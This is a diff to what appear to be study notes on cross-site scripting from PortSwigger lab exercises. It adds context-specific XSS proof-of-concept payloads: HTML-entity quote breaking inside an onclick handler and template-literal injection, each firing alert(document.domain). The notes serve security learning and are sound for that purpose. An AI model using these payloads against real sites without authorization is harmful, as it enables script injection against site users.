@@ -61,5 +61,24 @@ which gets converted to:
 `\\';alert(document.domain)//`
 
 ##### WAF blocks some characters
-https://portswigger.net/web-security/cross-site-scripting/contexts - #to-be-continued 
 https://portswigger.net/research/xss-without-parentheses-and-semi-colons
+https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked
+##### Making use of HTML-encoding
+Context:
+```html
+<a href="#" onclick="... var input='controllable data here'; ...">
+```
+payload:
+```html
+&apos;-alert(document.domain)-&apos;
+```
+
+##### XSS in JavaScript template literals
+Example:
+```html
+<script> ... var input = `controllable data here`; ... </script>
+```
+payload:
+```js
+${alert(document.domain)}
+```
